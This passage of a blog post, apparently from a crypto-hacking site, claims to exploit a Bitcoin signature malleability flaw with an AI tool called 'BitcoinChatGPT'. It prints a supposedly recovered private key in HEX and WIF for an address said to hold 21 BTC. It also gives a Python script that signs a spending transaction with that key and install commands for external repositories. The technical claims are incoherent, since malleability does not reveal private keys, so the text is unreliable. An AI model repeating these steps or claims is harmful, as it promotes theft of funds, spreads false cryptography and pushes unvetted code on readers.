<p class="has-medium-font-size">Click on the button&nbsp;<strong><code>Bitcoin Address</code></strong>and get the required value of the private key in&nbsp;<strong>HEX format</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-cbcb492145e7479db057f616dee7106e" style="color:#4092c2"><code><strong>17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951: 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-50-1.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4916"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size">We also click on the button&nbsp;<strong><code>Balance BTC</code></strong>and get the result of the balance amount:</p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-4b0ba0416f2f86bfeaabe9f873b3ec5a" style="color:#4092c2"><code><strong>_____________________________________________________________________________________________________

17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951: 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw: 21.2529214 BTC
_____________________________________________________________________________________________________

</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://youtu.be/isWxfa3PeHU?t=1310" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-51-1.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4917"></a><figcaption class="wp-element-caption"><strong><a href="https://youtu.be/isWxfa3PeHU?t=1310" target="_blank" rel="noreferrer noopener">Time-stamped video</a></strong></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-52.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4901"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center has-text-color has-link-color has-large-font-size wp-elements-373fa05094c0e112a9fdeebb08ab3bef" style="color:#187d58"><strong>Private key received!</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>To search for the&nbsp;<strong>Signature Malleability vulnerability, as a threat prevention for your own&nbsp;</strong><strong>Bitcoin</strong>&nbsp;and&nbsp;<strong>Ethereum</strong>&nbsp;cryptocurrency wallet,&nbsp;we can use and apply various machine learning methods to examples</em>&nbsp;.</p>
</blockquote>



<p>Let’s use the list from&nbsp;&nbsp;<a href="https://github.com/demining/Tutorials-Power-AI" target="_blank" rel="noreferrer noopener"><strong>“Tutorials Power AI”</strong></a>&nbsp;&nbsp;a widely used category of artificial intelligence to introduce business in various fields of cryptanalysis and cryptography in general.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong><em>Installation command:</em></strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-3871e28c4f03e855cbfa67e59f0896b8" style="color:#4092c2"><code><strong>git clone https://github.com/demining/Tutorials-Power-AI.git

cd Tutorials-Power-AI/

python tutorials.py
</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/process.gif" alt="Signature Malleability: A study of the vulnerability of a forged signature using a decodable Bitcoin Wallet file"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-1024x272.png" alt="Signature Malleability: A study of the vulnerability of a forged signature using a decodable Bitcoin Wallet file" class="wp-image-5654"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><a href="https://bitcoinchatgpt.org/" target="_blank" rel="noreferrer noopener"><strong>BitcoinChatGPT</strong></a>&nbsp;&nbsp;is an innovative AI-powered chatbot that helps users find vulnerabilities in Bitcoin cryptocurrency transactions. BitcoinChatGPT benefits and classifications give you the ability to check your Bitcoin address for various crypto wallet attack schemes. Machine learning based on cryptanalysis gives us the full ability to investigate various attacks on the algorithms used in the Bitcoin ecosystem. Bitcoin Wallet private key extraction tools are widely popular, where BitcoinChatGPT serves as an important and useful resource for cybersecurity.</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center">Exploiting the CVE-2024-42461: Signature Malleability vulnerability in the Elliptic library to create a Raw transaction using the BitcoinChatGPT machine learning process</h2>



<p class="has-medium-font-size">Let’s consider the construction of the structure of a vulnerable&nbsp;&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/RawTX.txt" target="_blank" rel="noreferrer noopener">Raw</a></strong>&nbsp;&nbsp;transaction in which the&nbsp;&nbsp;<strong><a href="https://bitcoinchatgpt.org/" target="_blank" rel="noreferrer noopener">BitcoinChatGPT module is used</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">







<p></p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://www.youtube.com/watch?v=u7vD01x8Os8"><img loading="lazy" decoding="async" width="664" height="380" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-2.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-3039" srcset="https://cryptodeeptech.ru/wp-content/uploads/2024/11/image-2.png 664w, https://cryptodeeptech.ru/wp-content/uploads/2024/11/image-2-300x172.png 300w" sizes="auto, (max-width: 664px) 100vw, 664px"></a></figure></div>


<p></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><strong>Let’s open the Google Colab version:</strong></p>
</blockquote>



<p><a href="https://colab.research.google.com/drive/1YGZiPtgY0vPQ3PwUvbAjQW8LcErVHRsT">https://colab.research.google.com/drive/1YGZiPtgY0vPQ3PwUvbAjQW8LcErVHRsT</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-d67d73b1c19c14b84d2ec63394e449b0" style="color:#4092c2"><code><strong>State of a vulnerable transaction in Bitcoin:

01000000
....01
........0dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935
............00000000
........8b483045
....0221
...........00
...........97255916a3cc4f69d4fa16f68219d0b1798d392fb0dce5fb0a358510df8cabe0
....0220
........1014656120e0a6e7c8c4a79ee22b3cdd4f55435e3e9bf3ab7287ae16858dd9d5
.....0141
.....049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461
....ffffffff
01
....d204000000000000
........1976
............a914
........d77522a2b18e0064aba02ca7f864a5bb22998259
....88ac
00000000</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-16-1024x670.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4734"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Let’s combine all the output values ​​into one common string using the Python script&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/combinex.py" target="_blank" rel="noreferrer noopener">combinex.py</a>&nbsp;:</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-43bf0e87707eb97a009fefbcb84c8f1d" style="color:#4092c2"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b48304502210097255916a3cc4f69d4fa16f68219d0b1798d392fb0dce5fb0a358510df8cabe002201014656120e0a6e7c8c4a79ee22b3cdd4f55435e3e9bf3ab7287ae16858dd9d50141049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461ffffffff01d2040000000000001976a914d77522a2b18e0064aba02ca7f864a5bb2299825988ac00000000</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><strong>Let’s open the BlockCypher option&nbsp;</strong><strong><a href="https://live.blockcypher.com/btc/decodetx" target="_blank" rel="noreferrer noopener">“Decode A Transaction”</a></strong>&nbsp;:</p>
</blockquote>



<p><a href="https://live.blockcypher.com/btc/decodetx">https://live.blockcypher.com/btc/decodetx</a></p>



<figure class="wp-block-image"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-1-1024x525.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4697"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><strong>After decoding the vulnerable Bitcoin Raw transaction we get the result:</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-151e1505683a60a585cd25dd20e6800f" style="color:#4092c2"><code><strong>{
    "addresses": [
        "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK",
        "1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw"
    ],
    "block_height": -1,
    "block_index": -1,
    "confirmations": 0,
    "double_spend": false,
    "fees": 2606688996428,
    "hash": "a5828ec5775b967c36ab5c6a0184aaa52fd64e6650d07287cc7688266c6dbb28",
    "inputs": [
        {
            "addresses": [
                "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK"
            ],
            "age": 344419,
            "output_index": 0,
            "output_value": 2606688997662,</strong>
<strong>            "prev_hash": "35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d",</strong>
<strong>.......
.......
.......</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><strong>Pay attention to Bitcoin HASH160:&nbsp;</strong><strong>d77522a2b18e0064aba02ca7f864a5bb22998259</strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-9.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4710"></figure></div>


<p><a href="https://github.com/demining/CryptoDeepTools/blob/dfc7da9a6b41d72253bfcb6ae6da2718de7d9b87/36SignatureMalleability/DecodeRawTX.txt#L31">https://github.com/demining/CryptoDeepTools/blob/dfc7da9a6b41d72253bfcb6ae6da2718de7d9b87/36SignatureMalleability/DecodeRawTX.txt#L31</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><a href="https://coinbin.ru/#verify" target="_blank" rel="noreferrer noopener">Transaction Script</a></h2>



<h5 class="wp-block-heading has-text-align-center">The above script has been decoded</h5>



<p><strong>BitcoinChatGPT</strong>&nbsp;creates a transaction structure using&nbsp;<code><strong>HASH</strong></code>the public key, where we see that Bitcoin address:&nbsp;<strong><a href="https://btc1.trezor.io/address/1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw" target="_blank" rel="noreferrer noopener">1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</a></strong>&nbsp;sends&nbsp;<strong><code>1234 satoshi</code></strong>to the same address within its network.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-2-1024x377.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4699"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Bitcoin HASH160 was generated using Python Script:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/wif_to_hash160.py" target="_blank" rel="noreferrer noopener"><strong>wif_to_hash160.py</strong></a></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-3.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4701"><figcaption class="wp-element-caption"><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/DecodeRawTX.txt#L31" target="_blank" rel="noreferrer noopener"><strong>d77522a2b18e0064aba02ca7f864a5bb22998259</strong></a></figcaption></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-4-1024x619.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4703"></figure></div>


<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/wif_to_hash160.py">https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/wif_to_hash160.py</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><strong>Question – Answer:</strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-5-1024x539.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4704"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-6-1024x584.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4705"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-7-1024x606.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4706"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Finally, the&nbsp;<strong><a href="https://github.com/BitcoinChatGPT/Signature-Malleability-Vulnerability-Algorithm/blob/main/BitcoinChatGPT_%E2%84%965_Signature_Malleability_Vulnerability_Algorithm.ipynb" target="_blank" rel="noreferrer noopener">BitcoinChatGPT</a></strong>&nbsp;module outputs the response to the file:&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/KEYFOUND.privkey" target="_blank" rel="noreferrer noopener">KEYFOUND.privkey</a></strong>&nbsp;storing the private key in two most used formats&nbsp;<strong>HEX &amp; WIF</strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-8-1024x669.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4707"></figure></div>


<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/KEYFOUND.privkey"><strong>https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/KEYFOUND.privkey</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-12acbb3a0b53da0e68297d79657e6f80" style="color:#4092c2"><code><strong>============================= KEYFOUND.privkey =============================

Private Key HEX: 0x17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951

Private Key WIF: 5HzpNjEsxrpxPFqBKaoRSnFeq7RP57mvzwgoQFVtAJNZBpLVyur

Bitcoin Address: 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw

Balance: 21.25292140 BTC

============================= KEYFOUND.privkey =============================</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><a href="https://youtu.be/nWU2c2haVoA" target="_blank" rel="noreferrer noopener">BitcoinChatGPT №5 Signature Malleability Vulnerability Algorithm</a></h2>



<p></p>







<p></p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://www.youtube.com/watch?v=nWU2c2haVoA"><img loading="lazy" decoding="async" width="667" height="391" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-3(1).png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-3042" srcset="https://cryptodeeptech.ru/wp-content/uploads/2024/11/image-3.png 667w, https://cryptodeeptech.ru/wp-content/uploads/2024/11/image-3-300x176.png 300w" sizes="auto, (max-width: 667px) 100vw, 667px"></a></figure></div>


<p></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center">Vulnerable Raw Transaction</h2>



<p>Let’s create a vulnerable Raw transaction from the received data using the&nbsp;&nbsp;<strong><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction" target="_blank" rel="noreferrer noopener">Broadcast Bitcoin Transaction repository</a></strong></p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Download and install the source code, open the terminal and run the command:</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-ed1ed2d6bd8eb54429f361c28733fbae" style="color:#4092c2"><code><strong>git clone https://github.com/smartibase/Broadcast-Bitcoin-Transaction.git
</strong></code></pre>



<p><strong>Catalog:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-37c252389923970f49833153c041c31d" style="color:#4092c2"><code><strong>cd Broadcast-Bitcoin-Transaction</strong></code></pre>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Let’s install three important libraries:</strong></p>
</blockquote>



<ul class="wp-block-list">
<li><a href="https://pypi.org/project/zmq/" target="_blank" rel="noreferrer noopener"><strong>zmq</strong></a></li>



<li><a href="https://pypi.org/project/urllib3/" target="_blank" rel="noreferrer noopener"><strong>urllib3</strong></a></li>



<li><a href="https://pypi.org/project/requests/" target="_blank" rel="noreferrer noopener"><strong>requests</strong></a></li>
</ul>



<figure class="wp-block-image"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-8-1024x495.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4733"><figcaption class="wp-element-caption"><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/blob/main/requirements.txt" target="_blank" rel="noreferrer noopener"><strong>requirements.txt</strong></a></figcaption></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Let’s run the command:</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-c3638457a19a8e59dfd773c6eeb0aa38" style="color:#4092c2"><code><strong>pip install -r requirements.txt</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the main file in&nbsp;<a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/" target="_blank" rel="noreferrer noopener">Notepad&nbsp;</a><a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/">++</a>&nbsp;and make a small change to the Python Script code:&nbsp;<strong><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/blob/main/main.py" target="_blank" rel="noreferrer noopener">main.py</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code has-text-color has-link-color wp-elements-adceca3e50bddbaa961145a54a133425" style="color:#4092c2"><code><strong>from io import BytesIO
from secp256k1 import *
from sighash import *

pk = PrivateKey.parse("5HzpNjEsxrpxPFqBKaoRSnFeq7RP57mvzwgoQFVtAJNZBpLVyur")
pk.address()
tx = bytes.fromhex("35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d")
index = 0
send = "1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw"
tx_in = TxIn(tx, index, b'', 0xffffffff)
tx_in._script_pubkey = Tx.get_address_data(pk.address())['script_pubkey']
tx_in._value = 2345
tx_ins = [ tx_in ]
tx_outs = [
    TxOut(1234, Tx.get_address_data(send)['script_pubkey'].serialize())
]
tx = Tx(1, tx_ins, tx_outs, 0, testnet=True)
signature(tx, 0, pk)
tx.serialize().hex()
print(tx.serialize().hex())
f = open("RawTX.txt", 'w')
f.write("" + tx.serialize().hex() + "" + "\n")
f.close()</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Let’s run the command:</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-ba63856e6306b76b5e1e36b8e2c44d96" style="color:#4092c2"><code><strong>python main.py</strong></code></pre>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center has-medium-font-size"><strong><a href="https://www.youtube.com/watch?v=8B2LKMBsVSE">Vulnerable transaction created&nbsp;</a><a href="https://www.youtube.com/watch?v=8B2LKMBsVSE" target="_blank" rel="noreferrer noopener">!</a></strong></p>
</blockquote>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Let’s open the RawTX file in the directory:</strong></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-43bf0e87707eb97a009fefbcb84c8f1d" style="color:#4092c2"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b48304502210097255916a3cc4f69d4fa16f68219d0b1798d392fb0dce5fb0a358510df8cabe002201014656120e0a6e7c8c4a79ee22b3cdd4f55435e3e9bf3ab7287ae16858dd9d50141049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461ffffffff01d2040000000000001976a914d77522a2b18e0064aba02ca7f864a5bb2299825988ac00000000</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center">The order of actions in the video:</h2>



<p></p>







<p></p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://www.youtube.com/watch?v=8B2LKMBsVSE"><img loading="lazy" decoding="async" width="671" height="387" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-4.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-3043" srcset="https://cryptodeeptech.ru/wp-content/uploads/2024/11/image-4.png 671w, https://cryptodeeptech.ru/wp-content/uploads/2024/11/image-4-300x173.png 300w" sizes="auto, (max-width: 671px) 100vw, 671px"></a></figure></div>


<p></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<ol class="wp-block-list">
<li><strong><em>It was this vulnerable RawTX that we looked at at the beginning of this article:</em></strong>&nbsp;<a href="https://cryptodeeptool.ru/signature-malleability/#aa553e57-81fe-4c3c-98dd-0d1b60ea55ee-link">↩︎</a></li>
</ol>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-20.png" alt="This image has an empty alt attribute; its file name is image-19-1024x422.png" class="wp-image-4773"><figcaption class="wp-element-caption"><strong>RawTX</strong>&nbsp;decoding process&nbsp;&nbsp;&nbsp;using tool&nbsp;<a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/tree/main/decoderaw" target="_blank" rel="noreferrer noopener"><strong>decoderaw</strong></a></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-medium-font-size"><em>As we know from&nbsp;<a href="https://keyhunters.ru/what-is-prompt-answers-and-how-is-it-related-to-machine-learning-and-artificial-intelligence/">the prompt responses of the&nbsp;</a><a href="https://colab.research.google.com/drive/1YGZiPtgY0vPQ3PwUvbAjQW8LcErVHRsT" target="_blank" rel="noreferrer noopener"><strong>BitcoinChatGPT</strong></a>&nbsp;module ,&nbsp;the Signature Malleability Vulnerability Algorithm can be used to solve complex cryptographic problems.</em></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Conclusion</h2>



<p>There are many methods to detect and prevent counterfeit signatures in the Bitcoin network. These methods range from simple solutions such as increasing the number of confirmations to more complex anomaly analysis systems and regular security protocol updates. Effective protection requires a comprehensive approach to network security and constant monitoring of new threats. Counterfeit signatures can lead to fraudulent transactions and loss of funds. The main methods used to detect and prevent such attacks are:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<h3 class="wp-block-heading">1. Increasing the number of confirmations</h3>



<p>One of the simplest ways to protect against counterfeit signatures is to increase the number of confirmations of a transaction before it is finally accepted. It is recommended to wait for at least six confirmations to reduce the likelihood of a successful attack. This ensures that the transaction was included in the block and cannot be reversed.</p>



<h3 class="wp-block-heading">2. Analysis of blocks and transactions</h3>



<p>Mining software and network nodes analyze blocks and transactions for conflicts and anomalies. This includes checking the signature for compliance with the format, as well as checking the values ​​of&nbsp;&nbsp;<em><strong>r</strong></em>&nbsp;&nbsp;and&nbsp;&nbsp;<em><strong>s</strong></em>&nbsp;&nbsp;for acceptable ranges. If the values ​​are outside the acceptable ranges, the transaction may be rejected.</p>



<h3 class="wp-block-heading">3. Implementation of anomaly analysis systems</h3>



<p>Using anomaly analysis systems can identify suspicious transactions and blockchains. These systems can use machine learning algorithms to detect unusual behavior in the network, which may indicate attempts to forge signatures.</p>



<h3 class="wp-block-heading">4. Network monitoring software</h3>



<p>Tools such as&nbsp;<a href="https://keyhunters.ru/sybil-and-eclipse-attacks/" target="_blank" rel="noreferrer noopener">Wireshark</a>&nbsp;can be used to analyze network traffic and identify suspicious activity. Monitoring network traffic can help identify&nbsp;<a href="https://keyhunters.ru/sybil-and-eclipse-attacks/" target="_blank" rel="noreferrer noopener">Sybil</a>&nbsp;or&nbsp;<a href="https://keyhunters.ru/sybil-and-eclipse-attacks/" target="_blank" rel="noreferrer noopener">Eclipse</a>&nbsp;attacks that can be used to manipulate transactions.</p>



<h3 class="wp-block-heading">5. Regularly update security protocols</h3>



<p>Regularly updating software and security protocols helps to eliminate known vulnerabilities, such as the&nbsp;<a href="https://cryptodeeptech.ru/deserialize-signature-vulnerability-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>DeserializeSignature</strong></a>&nbsp;vulnerability , which allows attackers to create invalid signatures. Updates should include fixes for all known vulnerabilities and security improvements.</p>



<h3 class="wp-block-heading">6. Multi-level confirmation</h3>



<p>Using multiple levels of transaction confirmation can improve network security. This could include additional checks by nodes or using third-party services to verify signatures.</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">References:</h2>



<ol class="wp-block-list">
<li><em><a href="https://cryptodeeptech.ru/doc/mertens.disproof.pdf" target="_blank" rel="noreferrer noopener"><strong>Odlyzko, Andrew; te Reile, Herman JJ «Disproving Mertens Conjecture»</strong></a>&nbsp;Journal for Pure and Applied Mathematics</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/lll25_Simon.pdf" target="_blank" rel="noreferrer noopener">D. Simon (2007). «Selected applications of LLL in number theory»</a></strong>&nbsp;LLL+25 Conference. Caen, France.</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/lll.pdf" target="_blank" rel="noreferrer noopener">Regev, Oded. «Lattices in Computer Science: LLL Algorithm»</a></strong>&nbsp;New York University. Retrieved 1 February 2019.</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/MathCryptoErrata.pdf" target="_blank" rel="noreferrer noopener">Silverman, Joseph. «Introduction to Mathematical Cryptography Errata»</a></strong>&nbsp;Brown University Mathematics Dept. Retrieved 5 May 2015</em>.</li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/compalg7.pdf" target="_blank" rel="noreferrer noopener">Bosma, Wieb. «4. LLL»</a></strong>&nbsp;Lecture notes. Retrieved 28 February 2010.</em></li>



<li><em><strong><a href="https://cryptodeeptech.ru/doc/2011-477.pdf" target="_blank" rel="noreferrer noopener">Abderrahmane, Nitaj. Cryptanalysis of NTRU with two public keys</a></strong>&nbsp;// International Association for Cryptologic Research. — Caen, France.</em></li>



